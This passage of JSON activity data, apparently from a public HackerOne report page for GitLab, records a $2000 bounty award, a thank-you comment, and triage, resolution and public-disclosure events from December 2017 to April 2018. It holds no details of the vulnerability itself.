Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T21:18:34.776Z","updated_at":"2017-12-18T21:18:34.776Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"jobert","url":"/jobert"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2233047,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Amazing, thanks @kathyw!","markdown_message":"\u003cp\u003eAmazing, thanks \u003ca href=\"/kathyw\"\u003e@kathyw\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-18T22:26:40.626Z","updated_at":"2017-12-18T22:26:40.626Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2241811,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-22T05:18:42.250Z","updated_at":"2017-12-22T05:18:42.250Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2241812,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-22T05:19:15.333Z","updated_at":"2017-12-22T05:19:15.333Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2665588,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-25T23:41:53.375Z","updated_at":"2018-04-25T23:41:53.375Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670828,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:20:24.251Z","updated_at":"2018-04-27T02:20:24.251Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670829,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:20:24.611Z","updated_at":"2018-04-27T02:20:24.611Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}